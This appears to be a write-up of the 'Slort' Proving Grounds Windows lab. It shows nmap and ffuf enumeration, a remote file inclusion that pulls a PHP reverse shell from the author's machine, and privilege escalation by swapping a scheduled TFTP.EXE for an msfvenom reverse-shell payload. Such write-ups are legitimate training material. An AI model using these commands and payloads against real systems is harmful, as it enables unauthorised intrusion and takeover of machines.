---
title: Slort PGP walkthrough
description: Target - Slort, OS - Windows, Difficulty - Intermediate
readTime: 10 min read
date: 01-10-2026
image: ../assets/images/slrt/slort-webpage.png
---
---
#### ***Enumeration***

Started off with a nmap scan and gathered information about the target  network, systems, services, open ports.

```
nmap -sVC -p- -Pn -n -T4 --open --min-rate=1000 -oN Slort-nmap 192.168.159.53

Nmap scan report for 192.168.104.53
Host is up (0.24s latency).
Not shown: 64958 closed tcp ports (reset), 563 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE       VERSION
21/tcp    open  ftp           FileZilla ftpd 0.9.41 beta
| ftp-syst: 
|_  SYST: UNIX emulated by FileZilla
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
3306/tcp  open  mysql?
| fingerprint-strings: 
|   NULL: 
|_    Host '192.168.45.186' is not allowed to connect to this MariaDB server
4443/tcp  open  http          Apache httpd 2.4.43 ((Win64) OpenSSL/1.1.1g PHP/7.4.6)
| http-title: Welcome to XAMPP
|_Requested resource was http://192.168.104.53:4443/dashboard/
|_http-server-header: Apache/2.4.43 (Win64) OpenSSL/1.1.1g PHP/7.4.6
5040/tcp  open  unknown
7680/tcp  open  pando-pub?
8080/tcp  open  http          Apache httpd 2.4.43 ((Win64) OpenSSL/1.1.1g PHP/7.4.6)
|_http-open-proxy: Proxy might be redirecting requests
|_http-server-header: Apache/2.4.43 (Win64) OpenSSL/1.1.1g PHP/7.4.6
| http-title: Welcome to XAMPP
|_Requested resource was http://192.168.104.53:8080/dashboard/
49664/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port3306-TCP:V=7.94SVN%I=7%D=2/2%Time=679F53F3%P=aarch64-unknown-linux-
SF:gnu%r(NULL,4D,"I\0\0\x01\xffj\x04Host\x20'192\.168\.45\.186'\x20is\x20n
SF:ot\x20allowed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server");
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2025-02-02T11:18:47
|_  start_date: N/A

```

Discovered the default page for XAMP running on port 4443 and 8080

![](/1dragon/assets/images/slrt/Pasted%20image%2020260113230126.png)

Found the `Document_Root`  at http://192.168.159.53:8080/dashboard/phpinfo.php which usually shouldn't be kept accessible.

![](/1dragon/assets/images/slrt/Pasted%20image%2020260113230103.png)
Further ran ffuf on both the ports 4443 and 8080. However they returned the same directory listings.

```
ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt -u "http://192.168.159.53:4443/FUZZ" -ac -t 500 --fc 403,404  

dashboard               [Status: 301, Size: 351, Words: 22, Lines: 10, Duration: 325ms]
xampp                   [Status: 301, Size: 347, Words: 22, Lines: 10, Duration: 323ms]
img                     [Status: 301, Size: 345, Words: 22, Lines: 10, Duration: 360ms]
site                    [Status: 301, Size: 346, Words: 22, Lines: 10, Duration: 333ms]
```
 
 Among the fuzzed directory listings `/site` looked insteresting.
 
Tried to access the `\site` page and discovered a new web page named as **SLORT**

---
#### ***Initial Access***

Upon analyzing the page and other tabs links it had. All of the links are loaded using the `?page=` parameter.

`http://192.168.159.53:8080/site/index.php?page=main.php`

This could potentially be a way for RCE by abusing the parameter used.

![](/1dragon/assets/images/slrt/Pasted%20image%2020260113231027.png)

Hosted a php web shell since the website uses php as its backend language.
Tried to get the reverse shell payload via the parameter.

http://192.168.159.53:8080/site/index.php?page=http://192.168.45.171/rev.php

That worked. The payload was fetched and reverse shell was captured at port 445 on local.
The user was rupert.

![](/1dragon/assets/images/slrt/Pasted%20image%2020260113231823.png)
These were the users in the target system.

![](/1dragon/assets/images/slrt/Pasted%20image%2020260113231837.png)

Captured the local flag at rupert's desktop 

![](/1dragon/assets/images/slrt/Pasted%20image%2020260113231852.png)
#### ***Privilege Escalation***

Analyzed other directories in the target and discovered `Backup` folder in `C:\`
The Backup directory had an Executable names a TFTP.EXE

![](/1dragon/assets/images/slrt/Pasted%20image%2020260113231956.png)
The info.txt showed that the the exe runs every 5 mins.

![](/1dragon/assets/images/slrt/Pasted%20image%2020260113232027.png)

User Rupert had full permission over the executable file in that directory.

![](/1dragon/assets/images/slrt/Pasted%20image%2020260113232231.png)

Hence, made a reverse shell in .exe format using msfvenom  transferred the payload file form local to target system and replaced the existing one with the same name.

```
msfvenom -p windows/x64/shell_reverse_tcp LPORT=445 LHOST=tun0 -f exe -o TFTP.EXE
```

![](/1dragon/assets/images/slrt/Pasted%20image%2020260113232435.png)

Had a nc listener at port 445 and successfully captured the shell as Administrator.

![](/1dragon/assets/images/slrt/Pasted%20image%2020260113234237.png)

Found the root flag in the administrators desktop.

![](/1dragon/assets/images/slrt/Pasted%20image%2020260113234306.png)

---

										Target compromised - |^| ^ ( |< 3 D